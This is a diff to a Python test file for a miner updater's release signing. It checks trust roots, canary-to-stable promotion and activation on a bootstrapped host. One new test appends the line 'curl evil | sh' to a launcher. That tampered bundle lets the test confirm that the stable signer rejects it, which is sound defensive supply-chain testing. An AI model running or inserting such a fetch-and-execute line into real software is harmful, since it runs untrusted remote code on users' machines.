@@ -22,14 +22,14 @@ import pytest
 from cryptography.hazmat.primitives import serialization
 
 from cathedral.miner_bootstrap import install
-from cathedral.miner_bundle import TREE_TRUST_ROOT, link_target
+from cathedral.miner_bundle import build_archive, link_target
 from cathedral.miner_products import SNP_MINER, find_launcher, read_launcher_profile
-from cathedral.miner_release import load_trust_root
 from cathedral.miner_updater import (
     LEGACY,
     HostConfig,
     HostPaths,
     MinerUpdaterHost,
+    Observation,
     read_activation_profile,
     update_once,
 )
@@ -97,7 +97,7 @@ def world(tmp_path):
     }
 
 
-def _canary(world, *extra: str, out: str = "canary.json", check: bool = True):
+def _canary(world, *extra: str, out: str = "canary.json", check: bool = True, archive: str | None = None):
     return _sign(
         "canary",
         "--private-key", str(world["canary_key"]),
@@ -107,7 +107,7 @@ def _canary(world, *extra: str, out: str = "canary.json", check: bool = True):
         "--netuid", str(NETUID),
         "--image", world["image"],
         "--state-schema", "1",
-        "--bundle-archive", world["bundle"]["archive"],
+        "--bundle-archive", archive or world["bundle"]["archive"],
         "--bundle-url", BUNDLE_URL,
         "--version", "2026.09.26",
         "--sequence", "1",
@@ -124,7 +124,8 @@ def _stable(world, *extra: str, key: str = "stable_key", key_id: str = "stable-1
         "--private-key", str(world[key]),
         "--signing-key-id", key_id,
         "--promote", str(world["tmp"] / "canary.json"),
-        "--bundle-archive", world["bundle"]["archive"],
+        "--bundle-archive", world.get("stable_archive", world["bundle"]["archive"]),
+        "--trust-root", str(world["trust"]),
         "--sequence", "2",
         "--lifetime-seconds", str(7 * 24 * 3600),
         "--out", str(world["tmp"] / "stable.json"),
@@ -136,8 +137,12 @@ def _stable(world, *extra: str, key: str = "stable_key", key_id: str = "stable-1
 def test_a_signed_release_installs_on_a_bootstrapped_host(world):
     tmp = world["tmp"]
     _canary(world)
-    signed = json.loads(_stable(world).stdout)
+    promoted = _stable(world)
+    signed = json.loads(promoted.stdout)
     assert signed["channel"] == "stable" and signed["netuid"] == NETUID
+    # The signer names what stable hosts will trust before it signs (trust review P1-2).
+    assert "stable hosts will trust: trust root sha256" in promoted.stderr
+    assert "stable-1:" in promoted.stderr and "may sign stable" in promoted.stderr
 
     # Bootstrap a host from a checkout of this commit carrying the same trust root.
     source = tmp / "src"
@@ -161,34 +166,45 @@ def test_a_signed_release_installs_on_a_bootstrapped_host(world):
     # A host bootstrapped at a commit runs byte-for-byte the tree that commit's bundle ships.
     assert report["installed_tree"] == world["bundle"]["tree_sha256"]
 
-    running: dict[str, str | None] = {read_launcher_profile(launcher).container: "legacy@sha256:" + "1" * 64}
+    container = read_launcher_profile(launcher).container
+    clock = [int(time.time())]
+    running: dict[str, tuple[str, float]] = {container: ("legacy@sha256:" + "1" * 64, 0.0)}
 
     def systemctl(arguments):
         if arguments[0] == "restart":
+            clock[0] += 1
             target = link_target(paths.miner_current)
             profile = read_activation_profile(paths, target)
-            running[str(profile["container"])] = profile.get("image")
+            running[str(profile["container"])] = (str(profile.get("image")), float(clock[0]))
+
+    def observe(name):
+        image, started = running[name]
+        return Observation(image=image, started_at=started, restarts=0, active=True)
 
     tree = report["installed_tree"]
     host = MinerUpdaterHost(
         config=config,
         paths=paths,
-        trusted_keys=load_trust_root((paths.updater_releases / tree / TREE_TRUST_ROOT).read_bytes()),
         running_tree=tree,
         fetch_metadata=lambda: (tmp / "stable.json").read_bytes(),
         fetch_bundle=lambda bundle: Path(world["bundle"]["archive"]).read_bytes(),
         probe_updater=lambda release, record: {},
         handoff=lambda release, fd: (1, None),
-        prepare_image=lambda release, profile: None,
+        prepare_image=lambda release, profile: release.state_schema,
         systemctl=systemctl,
-        current_image=running.get,
-        settled_image=running.get,
+        unit_state=lambda: "active",
+        observe=observe,
+        settle=observe,
         safe_to_activate=lambda: True,
-        now_unix=lambda: int(time.time()),
+        now_unix=lambda: clock[0],
+        sleep=lambda seconds: None,
+        boot_id=lambda: "boot",
         expected_uid=os.getuid(),
     )
     outcome = update_once(host)
     assert outcome.action == "activated", outcome.reason
+    confirmed = update_once(host)
+    assert confirmed.action == "current", confirmed.reason
     assert link_target(paths.miner_current) != LEGACY
     assert (paths.miner_current / "release.env").read_text().count(world["image"]) == 1
     assert (paths.miner_current / "launcher").read_bytes() == launcher.read_bytes()
@@ -241,3 +257,18 @@ def test_a_canary_key_cannot_promote_to_stable(world):
     _canary(world)
     result = _stable(world, key="canary_key", key_id="canary-1", check=False)
     assert result.returncode != 0 and "stable" in result.stderr
+
+
+def test_a_canary_key_cannot_put_code_onto_stable_hosts(world):
+    """Trust review P1-2: the stable signer promotes only what its own checkout builds."""
+
+    from tests.miner_update_support import build_tree
+
+    tampered_tree = world["tmp"] / "tampered"
+    build_tree(tampered_tree, launcher_suffix=b"curl evil | sh\n")
+    tampered = world["tmp"] / "tampered.tar.gz"
+    tampered.write_bytes(build_archive(tampered_tree))
+    _canary(world, archive=str(tampered))
+    world["stable_archive"] = str(tampered)
+    result = _stable(world, check=False)
+    assert result.returncode != 0 and "does not match this checkout's rebuild" in result.stderr
